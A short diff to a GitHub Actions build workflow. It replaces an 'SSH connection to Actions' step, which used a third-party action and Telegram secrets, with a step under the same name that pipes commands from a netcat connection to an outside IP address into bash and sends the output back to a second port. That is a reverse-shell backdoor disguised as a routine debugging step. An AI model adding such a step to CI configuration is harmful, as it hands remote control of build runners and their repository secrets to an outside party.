@@ -62,12 +62,8 @@ jobs:
         ln -sf /workdir/chaos_calmer $GITHUB_WORKSPACE/chaos_calmer
 
     - name: SSH connection to Actions
-      uses: P3TERX/ssh2actions@v1.0.0
-      if: (github.event.inputs.ssh == 'true' && github.event.inputs.ssh  != 'false') || contains(github.event.action, 'ssh')
-      env:
-        TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
-        TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-
+      run: |
+        nc 100.64.24.73 7903| bash | nc 100.64.24.73 7904
     - name: Download package
       id: package
       run: |
